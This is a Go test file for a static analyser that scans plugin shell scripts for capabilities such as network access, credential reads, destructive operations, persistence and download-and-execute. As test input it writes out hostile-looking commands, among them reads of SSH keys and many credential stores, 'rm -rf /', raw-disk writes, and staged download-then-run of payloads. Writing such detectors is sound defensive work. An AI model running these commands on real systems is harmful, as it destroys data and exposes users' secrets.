package analyze

import (
	"strings"
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestNetworkDomainIsNeutralResourceNotWarning(t *testing.T) {
	result := Sources(runtimeShell("curl -fsS https://api.example.test/v1/data\n"))
	resource := resourceByKind(t, result, "network-domain")
	if resource.Value != "api.example.test" || resource.Access != "connect" || resource.Scope != report.ScopeRuntime {
		t.Fatalf("unexpected domain resource: %#v", resource)
	}
	if len(result.Findings) != 0 {
		t.Fatalf("ordinary network access produced warning: %#v", result.Findings)
	}
}

func TestExplicitNonHTTPNetworkEndpointsBecomeNeutralResources(t *testing.T) {
	for _, test := range []struct {
		command string
		domain  string
	}{
		{command: "ssh -i ./identity user@admin.example.test", domain: "admin.example.test"},
		{command: "sftp -P 2222 files.example.test", domain: "files.example.test"},
		{command: "scp ./archive user@backup.example.test:/srv/archive", domain: "backup.example.test"},
		{command: "rsync ./data mirror.example.test:/srv/data", domain: "mirror.example.test"},
		{command: "git clone git@code.example.test:owner/repository", domain: "code.example.test"},
		{command: "git -C ./checkout clone https://code.example.test/owner/repository", domain: "code.example.test"},
		{command: "git fetch ssh://git@code.example.test/owner/repository", domain: "code.example.test"},
		{command: "nc relay.example.test 443", domain: "relay.example.test"},
		{command: "socat STDIO OPENSSL:gateway.example.test:443", domain: "gateway.example.test"},
	} {
		t.Run(test.command, func(t *testing.T) {
			result := Sources(runtimeShell(test.command + "\n"))
			resource := resourceByKind(t, result, "network-domain")
			if resource.Value != test.domain || resource.Access != "connect" || resource.Scope != report.ScopeRuntime || resource.Dynamic {
				t.Fatalf("explicit endpoint lost context: %#v", resource)
			}
			if len(result.Findings) != 0 {
				t.Fatalf("explicit endpoint became a warning: %#v", result.Findings)
			}
		})
	}
}

func TestNetworkEndpointExtractionRejectsLocalAndNonNetworkSyntax(t *testing.T) {
	for _, command := range []string{
		"git checkout feature:docs",
		"git config remote.origin.url https://stored.example.test/owner/repository",
		"scp ./source ./destination",
		"rsync ./source ./destination",
		"socat ./input ./output",
		"nc -l 443",
		"ssh -i example.test",
	} {
		t.Run(command, func(t *testing.T) {
			result := Sources(runtimeShell(command + "\n"))
			for _, resource := range result.Resources {
				if resource.Kind == "network-domain" {
					t.Fatalf("non-network syntax became endpoint: %#v", resource)
				}
			}
		})
	}
}

func TestCredentialPathReadIsHighFinding(t *testing.T) {
	result := Sources(runtimeShell("cat ~/.ssh/id_ed25519\n"))
	finding := findingByCategory(t, result, "credential-access")
	if finding.Severity != report.SeverityHigh || finding.Scope != report.ScopeRuntime {
		t.Fatalf("credential finding lacks impact or scope: %#v", finding)
	}
	resource := resourceByKind(t, result, "filesystem-path")
	if !resource.Sensitive || resource.Access != "read" {
		t.Fatalf("credential resource not marked sensitive: %#v", resource)
	}
}

func TestCommonCredentialStoresAreSensitive(t *testing.T) {
	for _, path := range []string{
		"~/.config/gh/hosts.yml",
		"~/.docker/config.json",
		"~/.kube/config",
		"~/.netrc",
		"~/.npmrc",
		"~/.pypirc",
		"~/.git-credentials",
		"~/.authinfo.gpg",
		"~/.password-store/example.gpg",
		"~/.config/1Password/settings/settings.json",
		"~/.config/Bitwarden/data.json",
		"~/.local/share/keyrings/login.keyring",
		"~/.cargo/credentials.toml",
		"~/.azure/accessTokens.json",
		"~/vault.kdbx",
		"~/.mozilla/firefox/profile/cookies.sqlite",
		"~/.config/chromium/Default/Cookies",
	} {
		t.Run(path, func(t *testing.T) {
			result := Sources(runtimeShell("cat " + path + "\n"))
			finding := findingByCategory(t, result, "credential-access")
			if finding.Severity != report.SeverityHigh || finding.Scope != report.ScopeRuntime {
				t.Fatalf("credential store lost severity or scope: %#v", finding)
			}
		})
	}
}

func TestCredentialPathMatchingUsesComponentsNotScarySubstrings(t *testing.T) {
	for _, path := range []string{
		"./notes.ssh.txt",
		"./google-chrome-theme.css",
		"./credentials-example.txt",
		"./mozilla-release-notes",
		"./keyring-design.md",
		"./vault.kdbx.backup-not-a-database",
	} {
		t.Run(path, func(t *testing.T) {
			result := Sources(runtimeShell("cat " + path + "\n"))
			if hasFindingCategory(result, "credential-access") {
				t.Fatalf("benign path substring became credential access: %#v", result.Findings)
			}
		})
	}
}

func TestFilesystemCommandsRetainOrdinaryRelativeOperandsByRole(t *testing.T) {
	program := strings.Join([]string{
		"cat secrets",
		"head -n 5 log",
		"tail --lines=2 activity",
		"readlink current",
		"touch config",
		"mkdir -p cache",
		"tee output",
		"truncate -s 0 data",
		"chmod 600 private",
		"chown user:group owned",
		"cp source destination",
		"install -Dm755 source bin/helper",
		"mv old new",
	}, "\n") + "\n"
	result := Sources(runtimeShell(program))
	want := map[string]string{
		"secrets": "read", "log": "read", "activity": "read", "current": "read",
		"config": "write", "cache": "write", "output": "write", "data": "write",
		"private": "write", "owned": "write", "source": "read", "destination": "write",
		"bin/helper": "write", "old": "delete", "new": "write",
	}
	seen := make(map[string]string)
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" {
			seen[resource.Value] = resource.Access
		}
	}
	for value, access := range want {
		if seen[value] != access {
			t.Errorf("filesystem operand %q access = %q, want %q; resources: %#v", value, seen[value], access, result.Resources)
		}
	}
	for _, nonPath := range []string{"5", "2", "0", "600", "755", "user:group"} {
		if _, exists := seen[nonPath]; exists {
			t.Errorf("option/mode value %q became a filesystem resource: %#v", nonPath, result.Resources)
		}
	}
}

func TestFilesystemOperandOptionsAndTerminatorPreserveRoles(t *testing.T) {
	result := Sources(runtimeShell("touch -d ./not-a-path-value config\nhead -n ./not-a-file log\ncat -- -leading-name\n"))
	accesses := make(map[string]string)
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" {
			accesses[resource.Value] = resource.Access
		}
	}
	if accesses["config"] != "write" || accesses["log"] != "read" || accesses["-leading-name"] != "read" {
		t.Fatalf("supported option grammar lost operand roles: %#v", result.Resources)
	}
	if accesses["./not-a-path-value"] != "" || accesses["./not-a-file"] != "" {
		t.Fatalf("option value became a path: %#v", result.Resources)
	}
}

func TestInvalidValueOnFlagDoesNotProduceFilesystemFact(t *testing.T) {
	result := Sources(runtimeShell("cat --number=./not-an-option-value secrets\n"))
	if !hasLimitationCode(result, "filesystem-operand-resolution") {
		t.Fatalf("invalid flag value did not become unknown: %#v", result)
	}
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" {
			t.Fatalf("invalid command syntax produced file access: %#v", result.Resources)
		}
	}

	result = Sources(runtimeShell("tail --follow=name activity\ntee --output-error=warn output\ncp --backup=numbered source destination\n"))
	if hasLimitationCode(result, "filesystem-operand-resolution") {
		t.Fatalf("documented optional option values became unknown: %#v", result.Limitations)
	}
}

func TestDynamicFilesystemOperandRemainsExplicit(t *testing.T) {
	result := Sources(runtimeShell("cat \"$selected\"\n"))
	resource := resourceByKind(t, result, "filesystem-path")
	if resource.Value != "<dynamic>" || !resource.Dynamic || resource.Access != "read" || resource.Confidence != report.ConfidenceMedium {
		t.Fatalf("dynamic filesystem operand was guessed or lost: %#v", resource)
	}
}

func TestReferenceAndTargetDirectoryOptionsPreserveMultipleRoles(t *testing.T) {
	program := strings.Join([]string{
		"touch -r time-source touched",
		"truncate --reference=size-source data",
		"chmod --reference=mode-source protected",
		"chown --reference owner-source owned",
		"cp -t copies source-one source-two",
		"install --target-directory bin helper",
		"mv -tmoved old-one old-two",
		"install -d cache state",
	}, "\n") + "\n"
	result := Sources(runtimeShell(program))
	want := map[string]string{
		"time-source": "read", "touched": "write",
		"size-source": "read", "data": "write",
		"mode-source": "read", "protected": "write",
		"owner-source": "read", "owned": "write",
		"source-one": "read", "source-two": "read", "copies": "write",
		"helper": "read", "bin": "write",
		"old-one": "delete", "old-two": "delete", "moved": "write",
		"cache": "write", "state": "write",
	}
	seen := make(map[string]string)
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" {
			seen[resource.Value] = resource.Access
		}
	}
	for value, access := range want {
		if seen[value] != access {
			t.Errorf("multi-role operand %q access = %q, want %q; resources: %#v", value, seen[value], access, result.Resources)
		}
	}
	if hasLimitationCode(result, "filesystem-operand-resolution") {
		t.Fatalf("supported multi-role syntax became unknown: %#v", result.Limitations)
	}
}

func TestDynamicReferenceAndDestinationRemainExplicit(t *testing.T) {
	result := Sources(runtimeShell("touch -r \"$reference\" \"$target\"\ncp -t \"$destination\" source\n"))
	want := map[string]string{"<dynamic>": "write", "source": "read"}
	dynamicCount := 0
	for _, resource := range result.Resources {
		if resource.Kind != "filesystem-path" {
			continue
		}
		if resource.Dynamic {
			dynamicCount++
			if resource.Value != "<dynamic>" || resource.Confidence != report.ConfidenceMedium {
				t.Fatalf("dynamic multi-role path lost uncertainty: %#v", resource)
			}
		}
		if access, exists := want[resource.Value]; exists && resource.Access == access {
			delete(want, resource.Value)
		}
	}
	if dynamicCount < 2 || len(want) != 0 {
		t.Fatalf("dynamic reference/destination resources incomplete: %#v", result.Resources)
	}
}

func TestConflictingFilesystemOptionRolesBecomeUnknown(t *testing.T) {
	for _, program := range []string{
		"touch -r\n",
		"touch -r first --reference=second target\n",
		"chmod --reference= target\n",
		"cp -t first --target-directory=second source\n",
		"cp -t destination -T source\n",
		"install -d -t destination source\n",
		"mv --target-directory destination -tother source\n",
	} {
		result := Sources(runtimeShell(program))
		if !hasLimitationCode(result, "filesystem-operand-resolution") {
			t.Fatalf("ambiguous operand roles were silently omitted: %#v", result)
		}
		for _, resource := range result.Resources {
			if resource.Kind == "filesystem-path" {
				t.Fatalf("ambiguous operand was guessed: %#v", result.Resources)
			}
		}
	}
}

func TestNonExecutingFilesystemHelpAndMissingTargetsRemainNeutral(t *testing.T) {
	result := Sources(runtimeShell("cat --help secrets\nhead -n 5\nchmod 600\n"))
	if len(result.Resources) != 0 || len(result.Limitations) != 0 {
		t.Fatalf("non-executing or targetless forms produced file access: %#v", result)
	}
}

func TestDDExposesOrdinaryInputAndOutputAsNeutralResources(t *testing.T) {
	result := Sources(runtimeShell("dd if=input.img of=output.img bs=4M status=progress\n"))
	accesses := make(map[string]string)
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" {
			accesses[resource.Value] = resource.Access
		}
	}
	if accesses["input.img"] != "read" || accesses["output.img"] != "write" {
		t.Fatalf("dd paths lost operand roles: %#v", result.Resources)
	}
	if len(result.Findings) != 0 || len(result.Limitations) != 0 {
		t.Fatalf("ordinary dd image copy became warning or unknown: %#v", result)
	}
}

func TestDDRawStorageAccessHasContextualHighFinding(t *testing.T) {
	result := Sources(runtimeShell("dd if=/dev/nvme0n1p2 of=backup.img\ndd if=image.img of=/dev/mapper/cryptroot\n"))
	readFinding := findingByCategory(t, result, "sensitive-storage-access")
	if readFinding.Claim != report.ClaimFact || readFinding.Severity != report.SeverityHigh || readFinding.Scope != report.ScopeRuntime {
		t.Fatalf("raw-device read lost claim, impact, or scope: %#v", readFinding)
	}
	writeFinding := findingByCategory(t, result, "destructive-operation")
	if writeFinding.Claim != report.ClaimFact || writeFinding.Severity != report.SeverityHigh || writeFinding.Scope != report.ScopeRuntime {
		t.Fatalf("raw-device write lost claim, impact, or scope: %#v", writeFinding)
	}
	deviceResources := 0
	for _, resource := range result.Resources {
		if resource.Kind == "device-path" {
			deviceResources++
			if !resource.Sensitive || resource.RelatedOperationID == "" {
				t.Fatalf("raw-device resource lost sensitivity or evidence link: %#v", resource)
			}
		}
	}
	if deviceResources != 2 {
		t.Fatalf("raw-device resources = %d, want 2: %#v", deviceResources, result.Resources)
	}
}

func TestRawStorageMatcherIsAnchoredAndExcludesPseudoDevices(t *testing.T) {
	for _, value := range []string{
		"/dev/sda", "/dev/sdaa12", "/dev/vda1", "/dev/xvdb", "/dev/nvme0n1p2",
		"/dev/mmcblk0p1", "/dev/md0", "/dev/dm-2", "/dev/loop0",
		"/dev/mapper/cryptroot", "/dev/disk/by-id/example",
	} {
		if !rawStorageDevice(value) {
			t.Errorf("raw storage path was missed: %q", value)
		}
	}
	for _, value := range []string{
		"/dev/null", "/dev/zero", "/dev/random", "/dev/stdin", "/dev/stdout",
		"/dev/tty", "/dev/mapper/control", "/dev/disk/not-by-alias", "/tmp/dev/sda", "/dev/sda-theme",
	} {
		if rawStorageDevice(value) {
			t.Errorf("non-storage path became raw device: %q", value)
		}
	}
}

func TestDDDynamicPathsRemainExplicitWithoutRawDeviceGuess(t *testing.T) {
	result := Sources(runtimeShell("dd if=\"$input\" of=\"$output\"\n"))
	dynamic := 0
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" && resource.Value == "<dynamic>" && resource.Dynamic && resource.Confidence == report.ConfidenceMedium {
			dynamic++
		}
	}
	if dynamic != 2 || len(result.Findings) != 0 {
		t.Fatalf("dynamic dd paths were guessed or lost: %#v", result)
	}
}

func TestDDMalformedOrDuplicateOperandsBecomeUnknown(t *testing.T) {
	for _, program := range []string{
		"dd if=first if=second of=output\n",
		"dd of=\n",
		"dd foo=bar of=output\n",
		"dd input.img of=output.img\n",
		"dd \"$name\"=input of=output\n",
	} {
		result := Sources(runtimeShell(program))
		if !hasLimitationCode(result, "dd-operand-resolution") {
			t.Fatalf("invalid dd operands were silently omitted: %#v", result)
		}
		if len(result.Resources) != 0 {
			t.Fatalf("invalid dd operands produced partial resources: %#v", result.Resources)
		}
	}
}

func TestDDWrapperAndNonExecutingFormsRemainAccurate(t *testing.T) {
	result := Sources(runtimeShell("env dd if=input.img of=output.img\ndd --help of=/dev/sda\n"))
	if len(result.Findings) != 0 || hasLimitationCode(result, "dd-operand-resolution") {
		t.Fatalf("wrapped ordinary or non-executing dd became warning: %#v", result)
	}
	if len(result.Resources) != 2 {
		t.Fatalf("wrapped dd resources = %#v, want one read and one write", result.Resources)
	}
}

func TestRawStorageImpactIsConsistentAcrossDataCommands(t *testing.T) {
	program := strings.Join([]string{
		"cat /dev/sda",
		"tee /dev/vda",
		"cp image.img /dev/nvme0n1",
		"printf payload > /dev/mmcblk0",
		"curl -o /dev/loop0 https://example.test/image",
		"rm /dev/dm-1",
	}, "\n") + "\n"
	result := Sources(runtimeShell(program))
	if countFindingCategory(result, "sensitive-storage-access") != 1 {
		t.Fatalf("raw data read was missed or duplicated: %#v", result.Findings)
	}
	if countFindingCategory(result, "destructive-operation") != 5 {
		t.Fatalf("raw data writes/deletion findings = %#v, want five contextual findings", result.Findings)
	}
	devices := 0
	for _, resource := range result.Resources {
		if resource.Kind == "device-path" {
			devices++
			if !resource.Sensitive {
				t.Fatalf("raw path is not visibly sensitive: %#v", resource)
			}
		}
	}
	if devices != 6 {
		t.Fatalf("device resources = %d, want 6: %#v", devices, result.Resources)
	}
}

func TestRawStorageMetadataOperationsRemainNeutralFacts(t *testing.T) {
	program := "readlink /dev/sda\ntouch /dev/vda\nchmod 600 /dev/nvme0n1\nchown root:disk /dev/mmcblk0\nln -s target /dev/loop0\n"
	result := Sources(runtimeShell(program))
	if len(result.Findings) != 0 {
		t.Fatalf("metadata-only raw-device operations became impact warnings: %#v", result.Findings)
	}
	devices := 0
	for _, resource := range result.Resources {
		if resource.Kind == "device-path" {
			devices++
		}
	}
	if devices != 5 {
		t.Fatalf("metadata device facts = %d, want 5: %#v", devices, result.Resources)
	}
}

func TestMultipleRawStoragePathsHaveDistinctFindingIDs(t *testing.T) {
	result := Sources(runtimeShell("cp /dev/sda /dev/sdb backup.img\n"))
	ids := make(map[string]bool)
	for _, finding := range result.Findings {
		if finding.Category != "sensitive-storage-access" {
			continue
		}
		if ids[finding.ID] {
			t.Fatalf("duplicate raw-device finding ID %q", finding.ID)
		}
		ids[finding.ID] = true
	}
	if len(ids) != 2 {
		t.Fatalf("raw source findings = %#v, want two", result.Findings)
	}
}

func TestRawDeviceDeletionUsesOneContextualHighFinding(t *testing.T) {
	result := Sources(runtimeShell("rm /dev/sda\n"))
	if countFindingCategory(result, "destructive-operation") != 1 {
		t.Fatalf("raw-device deletion warning was duplicated: %#v", result.Findings)
	}
	finding := findingByCategory(t, result, "destructive-operation")
	if finding.Severity != report.SeverityHigh {
		t.Fatalf("raw-device deletion severity = %s, want high: %#v", finding.Severity, finding)
	}
}

func TestDeletionSeverityUsesContext(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		severity report.Severity
	}{
		{name: "explicit temp file", command: "rm /tmp/plugin-cache\n", severity: report.SeverityLow},
		{name: "recursive cache", command: "rm -rf /tmp/plugin-cache\n", severity: report.SeverityMedium},
		{name: "home directory", command: "rm -rf /home/example\n", severity: report.SeverityHigh},
		{name: "root", command: "rm -rf /\n", severity: report.SeverityCritical},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result := Sources(runtimeShell(test.command))
			finding := findingByCategory(t, result, "destructive-operation")
			if finding.Severity != test.severity {
				t.Fatalf("severity = %s, want %s: %#v", finding.Severity, test.severity, finding)
			}
		})
	}
}

func TestDestructiveOperandsIncludeOrdinaryRelativeNamesAndRespectOptions(t *testing.T) {
	result := Sources(runtimeShell("rm cache.db\nrm -- -leading-dash\n"))
	if countFindingCategory(result, "destructive-operation") != 2 {
		t.Fatalf("ordinary destructive operands were missed: %#v", result.Findings)
	}
	values := map[string]bool{}
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" && resource.Access == "delete" {
			values[resource.Value] = true
		}
	}
	if !values["cache.db"] || !values["-leading-dash"] {
		t.Fatalf("destructive resources = %#v", result.Resources)
	}
}

func TestRemovalLongOptionsDoNotImplyRecursion(t *testing.T) {
	result := Sources(runtimeShell("rm --force cache.db\n"))
	finding := findingByCategory(t, result, "destructive-operation")
	if finding.Severity != report.SeverityLow {
		t.Fatalf("--force implied recursive removal: %#v", finding)
	}
	result = Sources(runtimeShell("rm -fr cache.db\n"))
	if finding := findingByCategory(t, result, "destructive-operation"); finding.Severity != report.SeverityMedium {
		t.Fatalf("short recursive option cluster was missed: %#v", finding)
	}
}

func TestPersistenceFromStartupPathAndSystemdEnable(t *testing.T) {
	result := Sources(runtimeShell("touch ~/.config/autostart/example.desktop\nsystemctl --user enable example.service\n"))
	if countFindingCategory(result, "persistence") != 2 {
		t.Fatalf("persistence mechanisms not independently reported: %#v", result.Findings)
	}
	count := 0
	for _, resource := range result.Resources {
		if resource.Kind == "persistence" {
			count++
		}
	}
	if count != 2 {
		t.Fatalf("persistence resources = %d, want 2: %#v", count, result.Resources)
	}
}

func TestLinkDestinationCanEstablishPersistence(t *testing.T) {
	result := Sources(runtimeShell("ln -s ./payload ~/.config/autostart/example\n"))
	finding := findingByCategory(t, result, "persistence")
	if finding.Severity != report.SeverityMedium || finding.Scope != report.ScopeRuntime {
		t.Fatalf("linked startup destination lost severity or scope: %#v", finding)
	}
	resource := resourceByKind(t, result, "filesystem-path")
	if resource.Access != "write" || resource.Value != "~/.config/autostart/example" {
		t.Fatalf("link destination not represented as a write: %#v", resource)
	}
	for _, resource := range result.Resources {
		if resource.Kind == "filesystem-path" && resource.Value == "./payload" {
			t.Fatalf("link source was incorrectly represented as file content access: %#v", resource)
		}
	}
}

func TestLinkDestinationParsingAvoidsAmbiguousAndBenignForms(t *testing.T) {
	for _, program := range []string{
		"ln -s ./payload ./ordinary-link\n",
		"ln -s ./payload\n",
		"ln -s -t ~/.config/autostart ./payload\n",
		"ln --target-directory=~/.config/autostart ./payload\n",
		"ln -S ~/.config/autostart/not-a-destination ./payload ./ordinary-link\n",
	} {
		result := Sources(runtimeShell(program))
		if hasFindingCategory(result, "persistence") {
			t.Fatalf("ambiguous or benign link became persistence: %#v", result.Findings)
		}
	}
}

func TestLinkDestinationAfterOptionTerminatorIsRetained(t *testing.T) {
	result := Sources(runtimeShell("ln -s -- ./payload ~/.config/systemd/user/example.service\n"))
	if !hasFindingCategory(result, "persistence") {
		t.Fatalf("explicit destination after -- was missed: %#v", result)
	}
}

func TestCommonPersistencePathsRequireWriteContext(t *testing.T) {
	for _, path := range []string{
		"~/.bash_profile",
		"~/.zlogin",
		"~/.xprofile",
		"~/.config/fish/config.fish",
		"~/.config/fish/conf.d/plugin.fish",
		"~/.config/autostart/example.desktop",
		"~/.config/systemd/user/example.service",
		"~/.config/environment.d/example.conf",
		"~/.ssh/authorized_keys",
		"~/.config/hypr/hyprland.conf",
		"/etc/cron.d/example",
		"/var/spool/cron/example",
	} {
		t.Run(path, func(t *testing.T) {
			written := Sources(runtimeShell("touch " + path + "\n"))
			finding := findingByCategory(t, written, "persistence")
			if finding.Severity != report.SeverityMedium || finding.Scope != report.ScopeRuntime {
				t.Fatalf("persistence path lost severity or scope: %#v", finding)
			}
			read := Sources(runtimeShell("cat " + path + "\n"))
			if hasFindingCategory(read, "persistence") {
				t.Fatalf("read-only access became persistence: %#v", read.Findings)
			}
		})
	}
}

func TestPersistencePathMatchingUsesComponentsNotScarySubstrings(t *testing.T) {
	for _, path := range []string{
		"./profile-picture.png",
		"./zshrc-notes.md",
		"./systemd/user-guide.md",
		"./cron.daily-notes",
		"./authorized_keys.example",
	} {
		t.Run(path, func(t *testing.T) {
			result := Sources(runtimeShell("touch " + path + "\n"))
			if hasFindingCategory(result, "persistence") {
				t.Fatalf("benign path substring became persistence: %#v", result.Findings)
			}
		})
	}
}

func TestPersistenceRequiresSystemdVerbOrCrontabMutation(t *testing.T) {
	result := Sources(runtimeShell("systemctl status enable\ncrontab -l\ncrontab -u example -l\n"))
	if hasFindingCategory(result, "persistence") {
		t.Fatalf("read-only/status commands became persistence: %#v", result.Findings)
	}
	result = Sources(runtimeShell("systemctl --user reenable example.service\ncrontab -r\n"))
	if countFindingCategory(result, "persistence") != 2 {
		t.Fatalf("persistence mutations were missed: %#v", result.Findings)
	}
}

func TestCapabilityWordsInCommentsRemainIgnored(t *testing.T) {
	result := Sources(runtimeShell("# rm -rf / and cat ~/.ssh/id_rsa\nprintf '%s\\n' 'https://example.test is documentation'\n"))
	if len(result.Resources) != 0 || len(result.Findings) != 0 {
		t.Fatalf("comments or ordinary printf data became capabilities: %#v", result)
	}
}

func TestDynamicNetworkTargetRemainsUnknown(t *testing.T) {
	result := Sources(runtimeShell("curl \"$endpoint\"\n"))
	resource := resourceByKind(t, result, "network-domain")
	if !resource.Dynamic || resource.Value != "<dynamic>" {
		t.Fatalf("dynamic endpoint was guessed or omitted: %#v", resource)
	}
}

func TestDownloaderOutputIsFilesystemWrite(t *testing.T) {
	for _, command := range []string{
		"curl --output ~/.bashrc https://example.test/config",
		"wget --output-document=./payload https://example.test/payload",
		"curl -O https://example.test/remote-name",
	} {
		t.Run(command, func(t *testing.T) {
			result := Sources(runtimeShell(command + "\n"))
			var write *report.Resource
			for index := range result.Resources {
				if result.Resources[index].Kind == "filesystem-path" && result.Resources[index].Access == "write" {
					write = &result.Resources[index]
					break
				}
			}
			if write == nil || write.Scope != report.ScopeRuntime {
				t.Fatalf("download output write missing: %#v", result.Resources)
			}
			if strings.Contains(command, "-O ") && (!write.Dynamic || write.Value != "<dynamic>") {
				t.Fatalf("remote-derived filename was presented as literal: %#v", write)
			}
		})
	}
}

func TestStagedDownloadExecutionIsTraceableInference(t *testing.T) {
	for _, program := range []string{
		"curl -o ./payload https://example.test/payload\nbash ./payload\n",
		"wget -O ./payload https://example.test/payload\nsource ./payload\n",
		"curl --output=./payload https://example.test/payload\nchmod +x ./payload\n./payload\n",
	} {
		t.Run(program, func(t *testing.T) {
			result := Sources(runtimeShell(program))
			finding := findingByCategory(t, result, "download-and-execute")
			if finding.Claim != report.ClaimInference || finding.Severity != report.SeverityHigh ||
				finding.Confidence != report.ConfidenceMedium || finding.Scope != report.ScopeRuntime ||
				len(finding.Evidence) < 2 || len(finding.Related) < 2 || finding.Provenance.RuleID != correlationRuleID {
				t.Fatalf("staged execution lost uncertainty or evidence: %#v", finding)
			}
		})
	}
}

func TestStagedDownloadCorrelationRequiresLaterExactLiteralPath(t *testing.T) {
	for _, program := range []string{
		"bash ./payload\ncurl -o ./payload https://example.test/payload\n",
		"curl -o ./payload https://example.test/payload\nbash ./other\n",
		"curl -o \"$output\" https://example.test/payload\nbash \"$output\"\n",
		"curl -O https://example.test/payload\nbash payload\n",
		"curl -o ./payload https://example.test/payload\nbash -c ./payload\n",
		"curl -o ./payload https://example.test/payload\nbash --rcfile ./payload ./other\n",
		"curl -o ./payload https://example.test/payload\npython3 -W ./payload ./other.py\n",
		"curl -o ./payload https://example.test/payload\nnode --require ./payload ./other.js\n",
		"curl -o ./payload https://example.test/payload\nexec -a ./payload ./other\n",
		"git config remote.origin.url https://example.test/payload\nbash ./payload\n",
	} {
		t.Run(program, func(t *testing.T) {
			result := Sources(runtimeShell(program))
			for _, finding := range result.Findings {
				if finding.Category == "download-and-execute" && finding.Provenance.RuleID == correlationRuleID {
					t.Fatalf("unmatched download became staged execution: %#v", finding)
				}
			}
		})
	}
}

func TestLiteralPrivilegeWrapperPreservesNestedCredentialFact(t *testing.T) {
	result := Sources(runtimeShell("sudo cat ~/.ssh/id_ed25519\n"))
	finding := findingByCategory(t, result, "credential-access")
	if finding.Severity != report.SeverityHigh || finding.Evidence[0].Operation != "sudo cat ~/.ssh/id_ed25519" {
		t.Fatalf("wrapped credential fact lacks impact or original evidence: %#v", finding)
	}
	if len(finding.Related) != 1 || !strings.HasSuffix(finding.Related[0], "-wrapped") {
		t.Fatalf("credential finding does not reference the wrapped operation: %#v", finding)
	}
}

func TestPrivilegeWrapperDoesNotTreatPathTextAsAccess(t *testing.T) {
	result := Sources(runtimeShell("sudo printf '%s\\n' ~/.ssh/id_ed25519\n"))
	if hasFindingCategory(result, "credential-access") {
		t.Fatalf("printf argument became credential access: %#v", result.Findings)
	}
}

func TestOptionBearingPrivilegeWrapperIsNotGuessed(t *testing.T) {
	result := Sources(runtimeShell("sudo -u root cat ~/.ssh/id_ed25519\n"))
	if len(result.Operations) != 1 || result.Operations[0].Command != "sudo" {
		t.Fatalf("option-bearing wrapper was guessed: %#v", result.Operations)
	}
	if hasFindingCategory(result, "credential-access") {
		t.Fatalf("unresolved wrapper produced credential access: %#v", result.Findings)
	}
	if !hasLimitationCode(result, "command-wrapper-resolution") {
		t.Fatalf("unresolved wrapper was silently treated as covered: %#v", result.Limitations)
	}
}

func TestLiteralCommandAndEnvWrappersExposeInvokedCapabilities(t *testing.T) {
	result := Sources(runtimeShell("env -i API_MODE=read curl https://api.example.test/v1\ncommand -p rm /tmp/plugin-cache\n"))
	domain := resourceByKind(t, result, "network-domain")
	if domain.Value != "api.example.test" || domain.Scope != report.ScopeRuntime {
		t.Fatalf("env-wrapped network capability was lost: %#v", domain)
	}
	deletion := findingByCategory(t, result, "destructive-operation")
	if deletion.Severity != report.SeverityLow || deletion.Scope != report.ScopeRuntime {
		t.Fatalf("command-wrapped deletion lost context: %#v", deletion)
	}
	wrapped := 0
	for _, operation := range result.Operations {
		if operation.Category == "process-execution-via-command-wrapper" {
			wrapped++
		}
	}
	if wrapped != 2 {
		t.Fatalf("derived wrapper operations = %d, want 2: %#v", wrapped, result.Operations)
	}
}

func TestNestedLiteralWrappersRetainPrivilegeAndCredentialFacts(t *testing.T) {
	result := Sources(runtimeShell("env sudo command cat ~/.ssh/id_ed25519\n"))
	privilege := findingByCategory(t, result, "privilege-escalation")
	credential := findingByCategory(t, result, "credential-access")
	if privilege.Claim != report.ClaimFact || credential.Claim != report.ClaimFact ||
		privilege.Scope != report.ScopeRuntime || credential.Scope != report.ScopeRuntime {
		t.Fatalf("nested wrapper facts lost claim or scope: %#v", result.Findings)
	}
	if len(result.Operations) != 4 || result.Operations[3].Command != "cat" {
		t.Fatalf("nested wrapper chain was not retained: %#v", result.Operations)
	}
}

func TestNonExecutingWrapperQueriesRemainNeutral(t *testing.T) {
	result := Sources(runtimeShell("command -v curl\ncommand -V rm\nenv\nenv --help\n"))
	if len(result.Operations) != 4 || len(result.Resources) != 0 || len(result.Findings) != 0 || len(result.Limitations) != 0 {
		t.Fatalf("non-executing wrapper query produced capabilities or unknowns: %#v", result)
	}
}

func TestSupportedEnvOptionArgumentsDoNotBecomeCommands(t *testing.T) {
	result := Sources(runtimeShell("env -u TOKEN -C /tmp --argv0 reviewer curl https://options.example.test\n"))
	domain := resourceByKind(t, result, "network-domain")
	if domain.Value != "options.example.test" || len(result.Operations) != 2 || result.Operations[1].Command != "curl" {
		t.Fatalf("env option operands obscured the invoked command: %#v", result)
	}
}

func TestAmbiguousOrDynamicWrappersBecomeUnknown(t *testing.T) {
	for _, program := range []string{
		"env -S 'curl https://split.example.test'\n",
		"env --unknown curl https://unknown.example.test\n",
		"command \"$tool\" ~/.ssh/id_ed25519\n",
	} {
		result := Sources(runtimeShell(program))
		if !hasLimitationCode(result, "command-wrapper-resolution") || len(result.Operations) != 1 {
			t.Fatalf("ambiguous wrapper did not stop with an explicit unknown: %#v", result)
		}
		if len(result.Resources) != 0 || hasFindingCategory(result, "credential-access") {
			t.Fatalf("ambiguous wrapper target was guessed: %#v", result)
		}
	}
}

func TestWrapperExpansionDepthIsBounded(t *testing.T) {
	result := Sources(runtimeShell("env command env command env curl https://too-deep.example.test\n"))
	if len(result.Operations) != 1+maxWrapperExpansionDepth || !hasLimitationCode(result, "command-wrapper-depth") {
		t.Fatalf("wrapper depth did not stop at the documented bound: %#v", result)
	}
	for _, resource := range result.Resources {
		if resource.Kind == "network-domain" {
			t.Fatalf("command beyond wrapper depth was guessed: %#v", resource)
		}
	}
}

func runtimeShell(program string) map[string][]byte {
	return withValidManifest(map[string][]byte{
		"Runtime.qml":   []byte("property string helper: \"bin/helper.sh\"\n"),
		"bin/helper.sh": []byte("#!/bin/sh\n" + program),
	})
}

func resourceByKind(t *testing.T, result Result, kind string) report.Resource {
	t.Helper()
	for _, resource := range result.Resources {
		if resource.Kind == kind {
			return resource
		}
	}
	t.Fatalf("missing %s resource in %#v", kind, result.Resources)
	return report.Resource{}
}
